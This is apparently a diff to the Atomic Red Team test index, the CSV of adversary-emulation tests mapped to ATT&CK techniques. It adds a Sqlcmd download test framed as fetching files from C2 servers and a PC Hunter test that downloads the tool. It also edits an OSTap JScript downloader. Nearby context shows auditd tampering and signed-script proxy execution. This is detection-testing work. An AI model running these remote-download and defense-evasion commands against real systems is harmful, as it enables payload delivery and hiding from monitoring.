@@ -1973,6 +1973,23 @@ input_arguments.destination_path.type: path
 input_arguments.destination_path.default: license.txt
 
 "
+T1105,Ingress Tool Transfer,File Download with Sqlcmd.exe,6934c16e-0b3a-4e7f-ab8c-c414acd32181,"One of the windows packages 'Sqlcmd.exe' can be abused to download malicious files from C2 servers
+This Atomic will exhibit the similar behavior by downloading a sample zip file from src directory of this Technique folder via GitHub URL",windows,,,sqlcmd -i #{remote_url} -o #{local_file_path},powershell,True,,"rm ""#{local_file_path}"" 2>$null | Out-Null",powershell,"dependencies.0.description: Windows package 'Sqlcmd' need to be available in the machine to execute this atomic successfully
+dependencies.0.prereq_command: if (Get-Command sqlcmd 2>$null) {exit 0} else {exit 1}
+dependencies.0.get_prereq_command: winget install Microsoft.Sqlcmd --silent 2>$null | Out-Null
+","input_arguments.remote_url.description: URL of the C2 Server from where file/s need to be downloaded
+
+input_arguments.remote_url.type: url
+
+input_arguments.remote_url.default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/T1105.zip
+
+input_arguments.local_file_path.description: The local file path along with filename to where the file needs to be downloaded and placed.
+
+input_arguments.local_file_path.type: path
+
+input_arguments.local_file_path.default: C:\T1105.zip
+
+"
 T1562.006,Impair Defenses: Indicator Blocking,Auditing Configuration Changes on Linux Host,212cfbcf-4770-4980-bc21-303e37abd0e3,"Emulates modification of auditd configuration files
 ",linux,,,"sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}
 if [ -f ""/etc/#{auditd_config_file_name}"" ];
@@ -15201,6 +15218,21 @@ input_arguments.processhacker_exe.type: string
 input_arguments.processhacker_exe.default: ProcessHacker.exe
 
 "
+T1057,Process Discovery,Process Discovery - PC Hunter,b4ca838d-d013-4461-bf2c-f7132617b409,"PC Hunter is a toolkit with access to hundreds of settings including kernels, kernel modules, processes, network, startup, and more. When abused, this tool can allow threat actors to effectively access sensitive processes, collect system information, and terminate security software.",windows,,,"Start-Process -FilePath ""C:\Temp\ExternalPayloads\PCHunter_free\#{pchunter64_exe}""",powershell,True,,,powershell,"dependencies.0.description: PCHunter must be present in device
+dependencies.0.prereq_command: if (Get-ChildItem -Path C:\ -Include *PCHunter64* -File -Recurse -ErrorAction SilentlyContinue) {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: Write-Host Downloading PC Hunter
+New-Item -Type Directory ""C:\Temp\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest ""https://www.snapfiles.com/directdl/PCHunter_free.zip"" -OutFile ""C:\Temp\ExternalPayloads\PCHunter_free.zip""
+Expand-Archive -LiteralPath 'C:\Temp\ExternalPayloads\PCHunter_free.zip' -DestinationPath C:\Temp\ExternalPayloads
+Write-Host Unzipping Installing Process Hunter
+","input_arguments.pchunter64_exe.description: Process hacker installation executables.
+
+input_arguments.pchunter64_exe.type: string
+
+input_arguments.pchunter64_exe.default: PChunter64.exe
+
+"
 T1216,Signed Script Proxy Execution,SyncAppvPublishingServer Signed Script PowerShell Command Execution,275d963d-3f36-476c-8bef-a2a3960ee6eb,"Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.
 Upon execution, calc.exe will be launched.
 ",windows,,,"C:\windows\system32\SyncAppvPublishingServer.vbs ""\n;#{command_to_execute}""
@@ -16584,7 +16616,7 @@ input_arguments.ms_product.default: Word
 
 "
 T1204.002,User Execution: Malicious File,OSTap Payload Download,3f3af983-118a-4fa1-85d3-ba4daa739d80,"Uses cscript //E:jscript to download a file
-",windows,,,"echo var url = ""#{file_url}"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
+",windows,,,"echo var url = ""#{file_url}"", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
 cscript //E:Jscript #{script_file}
 ",command_prompt,,,"del #{script_file} /F /Q >nul 2>&1
 ",,,"input_arguments.script_file.description: File to execute jscript code from
